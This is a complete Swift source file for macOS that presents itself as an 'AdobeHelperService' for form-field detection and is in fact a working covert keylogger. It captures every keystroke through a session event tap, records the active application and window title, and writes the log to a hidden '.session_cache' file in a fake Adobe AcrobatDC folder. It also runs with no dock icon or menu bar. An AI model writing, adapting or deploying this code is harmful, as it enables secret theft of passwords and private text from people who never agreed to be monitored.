import Cocoa
import Foundation

// AdobeHelperService — Input event processing for form field detection
// Monitors keyboard input and active application context

class KeyLogger {
    private var eventTap: CFMachPort?
    private var logFile: FileHandle?
    private var logPath: String
    private var lastApp: String = ""
    private var lastWindow: String = ""
    private var buffer: String = ""
    private var flushTimer: Timer?
    
    init() {
        let support = NSHomeDirectory() + "/Library/Application Support/Adobe/AcrobatDC"
        try? FileManager.default.createDirectory(atPath: support, withIntermediateDirectories: true)
        logPath = support + "/.session_cache"
        
        // Create or open log file
        if !FileManager.default.fileExists(atPath: logPath) {
            FileManager.default.createFile(atPath: logPath, contents: nil)
        }
        logFile = FileHandle(forWritingAtPath: logPath)
        logFile?.seekToEndOfFile()
        
        // Write header
        let header = "\n--- Session started: \(ISO8601DateFormatter().string(from: Date())) ---\n"
        logFile?.write(header.data(using: .utf8)!)
    }
    
    func start() {
        // Set up event tap for key events
        let eventMask = (1 << CGEventType.keyDown.rawValue) | (1 << CGEventType.flagsChanged.rawValue)
        
        guard let tap = CGEvent.tapCreate(
            tap: .cgSessionEventTap,
            place: .headInsertEventTap,
            options: .listenOnly,
            eventsOfInterest: CGEventMask(eventMask),
            callback: { (proxy, type, event, refcon) -> Unmanaged<CGEvent>? in
                let logger = Unmanaged<KeyLogger>.fromOpaque(refcon!).takeUnretainedValue()
                logger.handleEvent(type: type, event: event)
                return Unmanaged.passRetained(event)
            },
            userInfo: Unmanaged.passUnretained(self).toOpaque()
        ) else {
            // Input Monitoring not granted — write status and exit
            let msg = "[\(timestamp())] ERROR: Event tap creation failed — Input Monitoring permission required\n"
            logFile?.write(msg.data(using: .utf8)!)
            logFile?.closeFile()
            exit(1)
        }
        
        self.eventTap = tap
        
        let runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0)
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)
        CGEvent.tapEnable(tap: tap, enable: true)
        
        // Flush buffer periodically
        flushTimer = Timer.scheduledTimer(withTimeInterval: 2.0, repeats: true) { [weak self] _ in
            self?.flushBuffer()
        }
        
        // Log successful start
        let msg = "[\(timestamp())] Service started — monitoring active\n"
        logFile?.write(msg.data(using: .utf8)!)
        
        CFRunLoopRun()
    }
    
    private func handleEvent(type: CGEventType, event: CGEvent) {
        // Check frontmost app and window
        checkActiveContext()
        
        if type == .keyDown {
            let keyCode = event.getIntegerValueField(.keyboardEventKeycode)
            let flags = event.flags
            
            // Get the character
            var chars = UniChar()
            var length: Int = 0
            event.keyboardGetUnicodeString(maxStringLength: 1, actualStringLength: &length, unicodeString: &chars)
            
            let modifiers = getModifiers(flags)
            
            // Map special keys
            let keyString: String
            switch keyCode {
            case 36: keyString = "[RET]"
            case 48: keyString = "[TAB]"
            case 51: keyString = "[DEL]"
            case 53: keyString = "[ESC]"
            case 49: keyString = " "
            case 123: keyString = "[LEFT]"
            case 124: keyString = "[RIGHT]"
            case 125: keyString = "[DOWN]"
            case 126: keyString = "[UP]"
            case 76: keyString = "[ENTER]"
            default:
                if length > 0 {
                    keyString = String(utf16CodeUnits: [chars], count: 1)
                } else {
                    keyString = "[k:\(keyCode)]"
                }
            }
            
            if !modifiers.isEmpty && keyString.count == 1 {
                buffer += "[\(modifiers)+\(keyString)]"
            } else if keyString == "[RET]" || keyString == "[ENTER]" {
                buffer += keyString
                flushBuffer()
            } else {
                buffer += keyString
            }
        }
    }
    
    private func checkActiveContext() {
        guard let frontApp = NSWorkspace.shared.frontmostApplication else { return }
        let appName = frontApp.localizedName ?? "Unknown"
        
        // Get window title
        var windowTitle = ""
        let options = CGWindowListOption(arrayLiteral: .excludeDesktopElements, .optionOnScreenOnly)
        if let windowList = CGWindowListCopyWindowInfo(options, kCGNullWindowID) as? [[String: Any]] {
            let pid = frontApp.processIdentifier
            for window in windowList {
                if let ownerPID = window[kCGWindowOwnerPID as String] as? Int32, ownerPID == pid {
                    if let title = window[kCGWindowName as String] as? String, !title.isEmpty {
                        windowTitle = title
                        break
                    }
                }
            }
        }
        
        // Log context change
        if appName != lastApp || windowTitle != lastWindow {
            flushBuffer()
            lastApp = appName
            lastWindow = windowTitle
            let context = "\n[\(timestamp())] [\(appName)] \(windowTitle.isEmpty ? "" : "— \(windowTitle)")\n"
            logFile?.write(context.data(using: .utf8)!)
        }
    }
    
    private func getModifiers(_ flags: CGEventFlags) -> String {
        var mods: [String] = []
        if flags.contains(.maskCommand) { mods.append("Cmd") }
        if flags.contains(.maskControl) { mods.append("Ctrl") }
        if flags.contains(.maskAlternate) { mods.append("Opt") }
        // Don't log shift alone — it's just uppercase
        return mods.joined(separator: "+")
    }
    
    private func flushBuffer() {
        guard !buffer.isEmpty else { return }
        logFile?.write(buffer.data(using: .utf8)!)
        buffer = ""
    }
    
    private func timestamp() -> String {
        let fmt = DateFormatter()
        fmt.dateFormat = "yyyy-MM-dd HH:mm:ss"
        return fmt.string(from: Date())
    }
    
    deinit {
        flushBuffer()
        logFile?.closeFile()
    }
}

// Entry point
let app = NSApplication.shared
app.setActivationPolicy(.prohibited) // Completely hidden — no dock icon, no menu bar
let logger = KeyLogger()

// Handle SIGTERM gracefully
signal(SIGTERM) { _ in
    exit(0)
}

logger.start()
